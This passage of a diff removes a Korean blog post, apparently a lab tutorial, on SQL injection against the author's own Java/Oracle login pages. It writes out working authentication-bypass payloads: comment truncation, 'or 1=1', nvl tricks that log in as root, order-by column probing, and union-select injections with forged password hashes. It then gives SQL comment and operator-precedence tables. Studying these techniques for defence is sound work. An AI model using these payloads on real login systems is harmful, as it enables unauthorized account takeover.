-<code class="language-plaintext highlighter-rouge">select * from members where id='user2'/*' and password='*/and '1'='1';</code><br /><img src="https://user-images.githubusercontent.com/31990118/232984619-32b03055-7784-4d7b-ad5e-15a7bf6f1dd8.png" alt="Pasted image 20230419141124" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984682-5b1c1f8e-bd5b-442c-a209-f732dcf21e26.png" alt="Pasted image 20230419141032" /></li>
-  <li>블럭 단위로 주석처리 하였다.</li>
-</ul>
-
-<p><br /></p>
-<ul>
-  <li><strong>or 이용한 인증우회</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">user2' or '1'='1</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td>` `</td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select * from members where id='user2' or '1'='1' and PASSWORD=' '</code><br /><img src="https://user-images.githubusercontent.com/31990118/232984798-75e83f27-fab3-4e09-b546-9f1bad9dff19.png" alt="Pasted image 20230419141300" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984846-083c960b-50c9-4344-b391-e4486fb22736.png" alt="Pasted image 20230419141331" /></li>
-  <li>비교연산자 우선순위에 의해 and 연산자 부분을 먼저 계산을 하고 or 연산을 계산한다.<br /><code class="language-plaintext highlighter-rouge">select * from members where (id='user2' or ('1'='1' and PASSWORD=' '))</code></li>
-</ul>
-
-<p><br /><br /></p>
-<h4 id="2-식별과-인증을-따로-할-때">2. 식별과 인증을 따로 할 때</h4>
-
-<blockquote>
-  <p>로그인방법</p>
-  <ol>
-    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='아이디' </code></li>
-    <li>입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.</li>
-    <li>일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br /><code class="language-plaintext highlighter-rouge">select * from members  where id='db에서 불러온 id정보';</code></li>
-  </ol>
-</blockquote>
-
-<blockquote>
-  <p>로그인 코드<br /><script src="https://gist.github.com/MinGyu2/7714a6942bb2726177f0dcbfef5caaa7.js"></script></p>
-</blockquote>
-
-<blockquote>
-  <p>정상적인 로그인<br />
-<img src="https://user-images.githubusercontent.com/31990118/232985187-5a0d4782-8d8a-4f53-bdd6-c6e636026a14.png" alt="Pasted image 20230419141842" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985264-660444cd-f648-4933-8b3f-fb4b7d6e91c6.png" alt="Pasted image 20230419141903" /></p>
-</blockquote>
-
-<blockquote>
-  <p>union을 이용한 우회 공격 전 정확한 <strong>컬럼 수</strong> 찾기</p>
-  <ul>
-    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
-    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/232985373-2f1890c3-e762-43ce-a675-28c7904f68ed.png" alt="Pasted image 20230419141937" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985437-96a4348c-56d8-4fe1-bd1c-9628a2324d0c.png" alt="Pasted image 20230419141951" /></li>
-    <li><code class="language-plaintext highlighter-rouge">user2' order by 3 -- </code> 로그인 실패<br /><img src="https://user-images.githubusercontent.com/31990118/232985581-b986925c-674e-45f9-a0a3-2d13dedb546d.png" alt="Pasted image 20230419142020" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985629-99e7085d-df98-4268-b513-18ce477eb459.png" alt="Pasted image 20230419142050" /></li>
-    <li>즉 컬럼의 수가 2개인 것을 확인할 수 있다.</li>
-  </ul>
-</blockquote>
-
-<p><br /></p>
-<blockquote>
-  <p>공격 방법</p>
-</blockquote>
-
-<ul>
-  <li><strong>union + 주석 사용</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual -- </code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'</code><br /><img src="https://user-images.githubusercontent.com/31990118/232985841-7099d8b7-0441-4a9f-a001-5568d8614c67.png" alt="Pasted image 20230419142133" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985915-ea61d625-85cd-4bca-9e58-dd7836dc3101.png" alt="Pasted image 20230419142152" /></li>
-</ul>
-
-<p><br /></p>
-<ul>
-  <li><strong>union + where 사용</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual where '1'='1</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'</code><br /><img src="https://user-images.githubusercontent.com/31990118/232986108-6e532e72-4254-4531-9464-ef82413d123f.png" alt="Pasted image 20230419142239" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/232986157-f68af392-ddb2-4a6b-829e-62e9ce649116.png" alt="Pasted image 20230419142252" /></li>
-</ul>
-
-<p><br /><br /></p>
-<h4 id="3-식별과-인증을-동시에-할-때-hash-암호화된-비밀번호">3. 식별과 인증을 동시에 할 때(+ HASH 암호화된 비밀번호)</h4>
-<ul>
-  <li>웹서버는 사용자 사용하는 비밀번호를 HASH 암호화 하여 서버에 저장한다.</li>
-</ul>
-
-<blockquote>
-  <p>로그인 방법</p>
-  <ul>
-    <li>하나의 <code class="language-plaintext highlighter-rouge">sql 질의문</code> 으로 식별과 인증을 완료한다는 것이다.
-      <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">members</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'입력id'</span> <span class="k">and</span> <span class="n">hashpwd</span><span class="o">=</span><span class="n">standard_hash</span><span class="p">(</span><span class="s1">'입력 pwd'</span><span class="p">,</span><span class="s1">'SHA512'</span><span class="p">);</span>
-</code></pre></div>      </div>
-    </li>
-    <li>웹 서버에서 pwd 를 바로 비교하는것이 아닌 <strong>SHA512</strong> 알고리즘으로 HASH 암호화한 값을 비교한다.</li>
-    <li><strong>아이디</strong>와 <strong>비밀번호</strong>를 동시에 일치하면 유저 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.</li>
-    <li>하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.</li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p>로그인 코드 <br />
-<script src="https://gist.github.com/MinGyu2/10015945943d3c562131ca34225b8529.js"></script></p>
-</blockquote>
-
-<blockquote>
-  <p>정상적인 로그인<br /><img src="https://user-images.githubusercontent.com/31990118/232986886-8bd775f2-b4ea-4d8f-81b5-1052e894f004.png" alt="Pasted image 20230419142438" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/232986977-ab3e49bb-012e-40a8-b726-725242bf5d8d.png" alt="Pasted image 20230419142455" /></p>
-</blockquote>
-
-<blockquote>
-  <p>nvl 함수</p>
-  <ul>
-    <li>nvl 함수는 값이 null 인 경우 지정값을 출력하고 , 값이 null 아니면 그대로 출력한다.</li>
-    <li>nvl(값,  지정값)</li>
-    <li>‘1’ 은 null 이 아니다. 따라서 1이 출력된다.<br /><img src="https://user-images.githubusercontent.com/31990118/232987098-fed02520-2eab-4f8d-bf02-4e386a3d8166.png" alt="Pasted image 20230419143825" /></li>
-  </ul>
-</blockquote>
-
-<p><br /></p>
-<blockquote>
-  <p>공격 방법</p>
-</blockquote>
-
-<ul>
-  <li><strong>주석사용</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">user2' -- </code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td>` `</td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id from members where id='user2' -- ' and hashpwd=standard_hash('ksdjfaklsf','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990015-656e3828-1f9c-44ac-aef5-404079e11f67.png" alt="Pasted image 20230419142553" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/232990061-98b4cd2b-84f9-4ffb-85f8-3398a26fe40d.png" alt="Pasted image 20230419142616" /></li>
-</ul>
-
-<p><br /><br /></p>
-<ul>
-  <li><strong>주석 + or + nvl사용</strong> (members 테이블의 가장 상위에 있는 root 로 로그인된다.)</li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">*/ or '1'=nvl('1</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id from members where id='user2'/*' and hashpwd=standard_hash('*/ or '1'=nvl('1','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990160-db93d3d4-95cc-4498-90b2-0d20d2a552df.png" alt="Pasted image 20230419142842" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/232990195-078251e2-8dec-4601-9bb3-b84fcd2eb24f.png" alt="Pasted image 20230419142857" /></li>
-  <li>여기서 user2 사용자가 아닌 root로 로그인 된 것을 확인할 수 있다.</li>
-  <li>서버에서 완성된 쿼리는 모든 사용자 정보를 불러오고 서버는 사용자 정보들 중 맨위에 존재하는 사용자의 정보를 가져와 보여준다.</li>
-  <li>
-    <p>테이블 맨위에는 root 사용자가 존재하여 root 계정으로 로그인된 것 이다.
-<br /><br /></p>
-  </li>
-  <li><strong>주석 + and + nvl사용</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">*/ and '1'=nvl('1</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id from members where id='user2'/*' and hashpwd=standard_hash('*/ and '1'=nvl('1','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990461-99c1e174-9ff6-4b03-ad3c-a65c52e55953.png" alt="Pasted image 20230419144106" /><br /><img src="https://user-images.githubusercontent.com/31990118/232990496-9034bd9e-eb22-41a4-8351-925d908d97e8.png" alt="Pasted image 20230419144117" /></li>
-</ul>
-
-<p><br /><br /></p>
-<ul>
-  <li><strong>or 이용하기</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">user2' or '1'='1</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td>` `</td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id from members where id='user2' or '1'='1' and hashpwd=standard_hash(' ','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990748-9179397a-d4e8-4f39-b657-bbbcf04faa9c.png" alt="Pasted image 20230419143137" /><br /><img src="https://user-images.githubusercontent.com/31990118/232990788-47801f8e-ce8b-453b-a9a3-b43bb8ba0b98.png" alt="Pasted image 20230419143153" /></li>
-</ul>
-
-<p><br /><br /></p>
-<h4 id="4-식별과-인증을-따로-할-때-비밀번호-sha512-하여-table에-저장">4. 식별과 인증을 따로 할 때(+ 비밀번호 SHA512 하여 table에 저장)</h4>
-
-<blockquote>
-  <p>로그인 방법</p>
-  <ol>
-    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 해시로 저장된 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='아이디'</code></li>
-    <li>유저가 입력한 비밀번호를 해시 암호화 알고리즘을 통해 암호화 한다.</li>
-    <li>유저가 입력한 해시화 된 비밀번호와 db에서 불러온 해시화된 비밀번호를 비교한다.</li>
-    <li>서로 일치하면 db 에서 불러온 <code class="language-plaintext highlighter-rouge">id</code> 정보를 이용하여 나머지 유저 정보도 불러온다.</li>
-  </ol>
-</blockquote>
-
-<blockquote>
-  <p>코드<br /><script src="https://gist.github.com/MinGyu2/3ba980c0793432ddb51eb184be586ff3.js"></script></p>
-</blockquote>
-
-<blockquote>
-  <p>정상적인 로그인<br /><img src="https://user-images.githubusercontent.com/31990118/232991349-687a4c81-ef26-4c32-80b0-5bc5760cfecc.png" alt="Pasted image 20230419150421" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/232991402-b32657e8-1f6d-4feb-8c64-8ca1f3728d20.png" alt="Pasted image 20230419150437" /></p>
-</blockquote>
-
-<blockquote>
-  <p>정확한 컬럼 수 찾기</p>
-  <ul>
-    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
-    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/232991510-58554a20-098d-4531-b5e1-f664afcb53b3.png" alt="Pasted image 20230419144418" /></li>
-    <li>컬럼수가 2개라는 것을 알 수 있다.</li>
-  </ul>
-</blockquote>
-
-<p><br /></p>
-<blockquote>
-  <p>공격방법</p>
-</blockquote>
-
-<ul>
-  <li><strong>union 을 이용한다.</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual --</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='x' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual -- '</code><br /><img src="https://user-images.githubusercontent.com/31990118/233049085-c016daf8-8467-47ad-8d63-26668bfc33ac.png" alt="Pasted image 20230419145121" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/233049124-051680f1-71c0-45d5-b569-ff429fa6581a.png" alt="Pasted image 20230419145133" /></li>
-</ul>
-
-<p><br /></p>
-<ul>
-  <li><strong>직접 해시 암호한 값을 넣어준다.</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', hash('a','SHA512') from dual --</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">a</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>hash(‘a’,’SHA512’) = <code class="language-plaintext highlighter-rouge">1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75</code></li>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='2' union select 'user2', '1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75' from dual --'</code><br /><img src="https://user-images.githubusercontent.com/31990118/233049465-179b0584-4be4-4702-a13a-e7ed0bb58b3c.png" alt="Pasted image 20230419145351" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/233049512-f9fe88e5-5ccb-4863-89e5-be94b3eaef62.png" alt="Pasted image 20230419145407" /></li>
-</ul>
-
-<p><br /></p>
-
-<ul>
-  <li><strong>주석 없이 하기</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1 </code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>
-    <p>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1'</code><br />
-<img src="https://user-images.githubusercontent.com/31990118/233049659-a8d081d7-b534-4236-917d-9fa5306b7205.png" alt="Pasted image 20230419145543" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/233049710-435711d1-158a-4f42-849a-ace70d6b1dcc.png" alt="Pasted image 20230419145554" /></p>
-  </li>
-  <li>standard_hash(‘user2’,’SHA512’) 로 나오는 결과와 table 에 저장된 hash 로 암호화 된 패스워드는 타입이 다르다.</li>
-  <li>따라서 <strong>cast 함수</strong>를 이용하여 타입을 <strong>char(128)</strong> 로 변경하였다.</li>
-</ul>
-
-<p><br /><br /></p>
-
-<h4 id="5-식별과-인증을-따로-할-때-id-두번-확인하기-">5. 식별과 인증을 따로 할 때(+ id 두번 확인하기 )</h4>
-
-<blockquote>
-  <p>로그인방법</p>
-  <ol>
-    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='아이디' and id='아이디'</code></li>
-    <li>여기서 id를 두번 확인한 것을 알 수 있다.</li>
-    <li>입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.</li>
-    <li>일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br /><code class="language-plaintext highlighter-rouge">select * from members  where id='db에서 불러온 id정보';</code></li>
-  </ol>
-</blockquote>
-
-<blockquote>
-  <p>로그인 코드<br />
-<script src="https://gist.github.com/MinGyu2/4838aebdc75359591b92074aff22d9b9.js"></script></p>
-</blockquote>
-
-<blockquote>
-  <p>정상적인 로그인<br />
-<img src="https://user-images.githubusercontent.com/31990118/233050196-c0143052-3671-4b80-b093-26faa1a48362.png" alt="Pasted image 20230419150308" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/233050247-58e103c1-83b5-4b53-bde1-bfff07bae2f4.png" alt="Pasted image 20230419150324" /></p>
-</blockquote>
-
-<p><br /></p>
-<blockquote>
-  <p>정확한 컬럼 수 찾기</p>
-  <ul>
-    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
-    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/233050601-910ace99-8195-40c5-a231-ef871db2e4ab.png" alt="Pasted image 20230419145849" /><br /><img src="https://user-images.githubusercontent.com/31990118/233050662-6455b018-b493-4f44-94fa-21555d6111c5.png" alt="Pasted image 20230419150003" /></li>
-    <li><code class="language-plaintext highlighter-rouge">user2' order by 3 -- </code> 로그인 실패</li>
-    <li>즉 컬럼의 수는 2개 라는것을 알 수 있다.</li>
-  </ul>
-</blockquote>
-
-<p><br /></p>
-
-<blockquote>
-  <p>공격방법</p>
-</blockquote>
-
-<ul>
-  <li><strong>union + 주석 사용</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','a' from dual -- </code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">a</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','a' from dual -- ' and id='x' union select 'user2','a' from dual -- '</code><br /><img src="https://user-images.githubusercontent.com/31990118/233051049-a26dfe1e-a888-412b-a552-54f56d8b4f06.png" alt="Pasted image 20230419150030" />
-<br /><img src="https://user-images.githubusercontent.com/31990118/233051097-c07becb0-6e56-458a-b33d-1401cea13e36.png" alt="Pasted image 20230419150041" /></li>
-</ul>
-
-<p><br /></p>
-
-<blockquote>
-  <p>특징</p>
-  <ul>
-    <li>id를 한번확인 하는 방법보다 2번 확인을 하면 공격자가 인증 쿼리 예측하기 힘들다.</li>
-    <li><code class="language-plaintext highlighter-rouge">where</code> 문을 추가할 수 없다.<br />id에 다음 쿼리를 입력하여도 로그인이 안된다.<br /> <code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual where '1'='1</code></li>
-  </ul>
-</blockquote>
-
-<p><br /><br /></p>
-<h3 id="단방향-해시-함수">단방향 해시 함수</h3>
-<hr />
-<ul>
-  <li>임이의 길이를 갖는 데이터를 고정된 길이의 데이터로 변환시켜주는 함수이다.</li>
-  <li>위변조 여부를 판별하거나, 무결성을 검증하는데 사용된다.</li>
-  <li>비밀번호를 서버에 안전하게 저장하기 위해 사용한다.</li>
-  <li>MD5, SHA1, SHA256, SHA512 등이 있다.</li>
-</ul>
-
-<h3 id="sql--차이">SQL  차이</h3>
-<hr />
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>mysql</th>
-      <th>oracle db</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>한줄 주석</td>
-      <td>#, –</td>
-      <td>–</td>
-    </tr>
-    <tr>
-      <td>부분 주석</td>
-      <td>/**/</td>
-      <td>/**/</td>
-    </tr>
-    <tr>
-      <td>SHA512</td>
-      <td>SHA2(‘A’,512)</td>
-      <td>standard_hash(‘A’,’SHA512’ )</td>
-    </tr>
-    <tr>
-      <td>더미 테이블</td>
-      <td>select ‘a’, ‘b’</td>
-      <td>select ‘a’,’b’ from dual</td>
-    </tr>
-  </tbody>
-</table>
-
-<p><br /><br /></p>
-
-<h3 id="oracle-sql-연산자-우선순위">Oracle SQL 연산자 우선순위</h3>
-<hr />
-
-<table>
-  <thead>
-    <tr>
-      <th>연산자</th>
-      <th>설명</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>산술연산자</td>
-      <td>** * , /, +, - **</td>
-    </tr>
-    <tr>
-      <td>연결연산자</td>
-      <td>||</td>
-    </tr>
-    <tr>
-      <td>비교연산자</td>
-      <td>=, &gt; , &lt; , &gt;= , &lt;= , &lt;&gt; , != , ^=</td>
-    </tr>
-    <tr>
-      <td>논리연사자</td>
-      <td>BETWEEN, NOT, AND, OR</td>
-    </tr>
-    <tr>
-      <td>SQL 연산자</td>
-      <td>LIKE, NOT LIKE, IN, EXISTS</td>
-    </tr>
-    <tr>
-      <td>집합 연산자</td>
-      <td>UNION ALL, UNION, INTERSECT, MINUS</td>
-    </tr>
-  </tbody>
-</table>
-
-<table>
-  <thead>
-    <tr>
-      <th>순서</th>
-      <th>연산자</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>1</td>
-      <td>괄호</td>
-    </tr>
-    <tr>
-      <td>2</td>
-      <td>* , /</td>
-    </tr>
-    <tr>
-      <td>3</td>
-      <td>+ , -</td>
-    </tr>
-    <tr>
-      <td>4</td>
-      <td>= , &lt;&gt; , &lt; , &gt; , &lt;= , &gt;=</td>
-    </tr>
-    <tr>
-      <td>5</td>
-      <td>IS (IS NULL, IS NOT NULL, IS EMPTY, IS NOT EMPTY)</td>
-    </tr>
-    <tr>
-      <td>6</td>
-      <td>BETWEEN</td>
-    </tr>
-    <tr>
-      <td>7</td>
-      <td>NOT</td>
-    </tr>
-    <tr>
-      <td>8</td>
-      <td>AND</td>
-    </tr>
-    <tr>
-      <td>9</td>
-      <td>OR</td>
-    </tr>
-  </tbody>
-</table>
-
-<h3 id="참고-사이트">참고 사이트</h3>
-<hr />
-<ul>
-  <li><a href="https://graypastel.tistory.com/entry/ORACLE%EC%9D%98-%EC%97%B0%EC%82%B0%EC%9E%90-%EC%9A%B0%EC%84%A0%EC%88%9C%EC%9C%84">ORACLE의 연산자 우선순위 (tistory.com)</a></li>
-  <li><a href="https://m.blog.naver.com/michael_cho77/221570607776">오라클 - 11. 오라클의 연산자우선순위 : 네이버 블로그 (naver.com)</a></li>
-  <li><a href="https://docs.oracle.com/cd/E49933_01/server.770/es_eql/src/ceql_expr_precedence_rules.html">Operator precedence rules (oracle.com)</a></li>
-  <li><a href="https://bamtory29.tistory.com/entry/MySQL-%EC%A3%BC%EC%84%9D">MySQL 주석 (tistory.com)</a></li>
-  <li><a href="https://upbitcare.com/academy/education/blockchain/52">해시 함수는 무엇인가?</a></li>
-  <li><a href="https://gent.tistory.com/189">오라클 NVL, NVL2 함수 사용방법 (null, 공백, 치환) (tistory.com)</a></li>
-  <li><a href="https://learn.microsoft.com/ko-kr/sql/t-sql/data-types/data-type-conversion-database-engine?view=sql-server-ver16">데이터 형식 변환(데이터베이스 엔진) - SQL Server</a></li>
-  <li><a href="https://hyejin.tistory.com/157">oracle 비교 함수 (DECODE(), LEAST(), GREATEST(), NVL(), WIDTH_BUCKET() )</a></li>
-  <li><a href="https://stackoverflow.com/questions/2568469/storing-sha-512-hashes-in-mysql">php - Storing SHA-512 Hashes in MySQL - Stack Overflow</a></li>
-  <li><a href="https://blog.jiniworld.me/93">MySQL Function 암호화 알고리즘(AES, MD5, SHA1, SHA2) (jiniworld.me)</a></li>
-  <li><a href="https://atotw.tistory.com/24">Oracle STANDARD_HASH 설명 : 오라클 함수 (tistory.com)</a></li>
-  <li><a href="https://blog.jiniworld.me/93">MySQL Function암호화 알고리즘(AES, MD5, SHA1, SHA2) (jiniworld.me)</a></li>
-  <li><a href="https://imlena94.tistory.com/entry/SQL-Injection-%EA%B8%B0%EC%B4%88-MSORACLEMY-SQL-%EC%8B%9C%EA%B0%84%EC%A7%80%EC%97%B0-%EC%A3%BC%EC%84%9D-%EB%93%B1">SQL Injection 기초 - MS/ORACLE/MY SQL , 시간지연, 주석 등 (tistory.com)</a></li>
-  <li><a href="https://jhnyang.tistory.com/470">SQL 정렬하기 order by 쿼리 사용법 1, 2 desc 의미 (tistory.com)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SQL" /><category term="Oracle DB" /><category term="SQL Injection" /><category term="Java" /><summary type="html"><![CDATA[SQL Injection 이란? sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다. 웹 해킹 기술중 하나이다.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Web" /><category term="Oracle DB" /><category term="Java" /><category term="Servlet" /><category term="JSP" /><summary type="html"><![CDATA[회원가입 구현하기.]]></summary></entry></feed>
